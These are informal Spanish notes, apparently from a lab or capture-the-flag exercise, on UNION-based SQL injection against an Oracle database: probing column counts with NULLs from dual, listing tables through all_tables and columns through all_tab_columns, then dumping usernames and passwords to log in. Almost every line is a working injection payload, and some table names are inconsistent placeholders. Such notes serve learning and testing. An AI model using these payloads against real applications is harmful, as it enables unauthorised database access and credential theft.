aca como tal bueno supongamos que no sabemos cuantas columnas hay 
ESTO ES ORACLE

' UNION SELECT NULL,NULL from dual -- -

aca no hay como tal un information_schema

asi que se hace algo como

' UNION SELECT NULL, table_name FROM all_tables -- -

encontramos una tabla rara

USERS_algoraro

aca no se puede consultar columname en all_tables pero se puede hacer asi consultando en all_tab_columns

' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS_CXJPOM' -- -

PONER EL NOMBRE DE LA TABLA ENTRE COMILLAS

aca sacamos 

USERNAME_algoraro
PASSWORDS_algoraro

ahora

' UNION SELECT USERNAME_HKWIRJ, PASSWORD_algoraro FROM USERS_algoraro -- -

y obtenemos la pass y solo nos logeamos
